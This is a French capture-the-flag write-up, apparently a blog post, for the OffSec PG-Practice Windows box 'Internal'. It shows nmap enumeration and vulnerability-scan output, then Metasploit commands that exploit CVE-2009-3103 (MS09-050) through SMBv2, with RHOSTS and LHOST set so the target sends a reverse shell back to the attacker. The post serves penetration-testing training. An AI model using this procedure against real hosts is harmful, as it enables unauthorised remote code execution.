---
title: PG-Practice Internal 
meta_title: ""
description: La box Internal est une box proposée par l'Offsec dans sa catégorie PG-Practice. Il s'agit d'une box Windows Easy exploitant une vulnérabilité SMB peu connue. Elle ne requiert pas d'élévation de privilèges.
date: 2024-04-04T05:00:00Z
image: /images/offsec-banner.png
categories:
  - Réaliste
  - Easy
author: Emma.exe
tags:
  - realiste
  - pg-practice
  - offsec
draft: false
---

# Introduction

La box Internal est une box proposée par l'Offsec dans sa catégorie PG-Practice.
Il s'agit d'une box Windows Easy exploitant une vulnérabilité SMB peu connue.
Elle ne requiert pas d'élévation de privilèges.
# Enumération

On commence toujours par énumérer la machine avec nmap.
J'utilise les options suivantes : 
- `-p-` pour énumérer tous les ports
- `-sV` pour obtenir les versions des services

```sh
nmap -p- 192.168.242.40 -sV            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 09:26 EDT
Nmap scan report for 192.168.242.40
Host is up (0.016s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.70 seconds
```

Il ny a rien de particulier d'ouvert, on peut tester si la vulnérabilité MS10 17 (eternal blue) est présente sur la machine : 
```sh
nmap -p445 --script smb-vuln-ms17-010 192.168.242.40
```

C'est effectivement vulnérable !
Cependant, il est important d'énumérer la machine entièrement avant de passer à la phase d'exploitation.

Nous allons donc effectuer un autre scan de vulnérabilité plus généraliste avec nmap : 
```sh
nmap --script vuln 192.168.242.40 
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false

```

On voit que la machine est aussi vulnérable à la faille "SMBv2 Negotiation Vulnerability" c'est-à-dire la CVE-2009-3103. Il est plus probable que ce soit cette vulnérabilité-là que l'auteur de la box veut nous faire exploiter.
En effet, elle est très intéressante puisqu'elle va permettre d'effectuer une RCE (Remote Execution Code) et potentiellement nous permettre d'obtenir un shell interactif. 
# Recherche d'exploit

Afin de trouver un exploit, je commence par me renseigner sur la vulnérabilité.
Premièrement, les vulnérabilités Windows sont souvent appelés par l'indicatif Microsoft.
Dans notre cas, on voit qu'elle est aussi appelé "MS09-050".
La vulnérabilité est due à une mauvaise implémentation du protocole SMBv2 dans certaines versions de Windows

Je fais une recherche sur le site https://exploit-db.com en utilisant MS09-050 et je constate qu'il existe plusieurs exploits.

exploit-db nous permet de voir si l'exploit a été vérifié ou non. Dans la mesure du possible, on privilégie les exploits qui le sont.

> Si vous décidez de choisir un exploit non vérifié, il est important de regarder ce que fait réellement l'exploit. 

Ici il n'y en a qu'un seul vérifié, disponible ici : 
https://www.exploit-db.com/exploits/16363

Il s'agit d'un module Metasploit.

# Exploitation

Nous lançons donc Metasploit en sudo :
```sh
sudo msfconsole
```

On recherche l'exploit en recherchant son ID : 
```sh
search exploit ms09_050_smb2_negotiate_func_index
```

Il devrait normalement apparaitre dans la recherche. 
{{< image src="images/PG-Internal-msfconsole-search.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
On récupère son chemin et on tape la commande :

```sh
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index  
```

On affiche les options que nécessite l'exploit pour fonctionner en tapant la commande : 
```sh
show options
```

{{< image src="images/PG-Internal-msfconsole-options.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}

On voit deux options requises qui ne sont automatiquement renseignée ou qu'il faut modifier : l'hôte distant (Remote Host) et l'hôte qui va réceptionner le shell (Listen Host).

On configure les options comme suit : 
```sh
set RHOSTS <ip-cible>
set LHOST <ip-local>
```

> Pour l'IP local, il faut bien choisir l'IP de l'interface qui communique avec le réseau Offsec (généralement celle de tun0)

On exécute l'exploit en tapant la commande : 
```sh
run
```

Au bout de quelques instants, on obtient un shell et on récupère le flag qui se trouve toujours sur le bureau Administrateur.
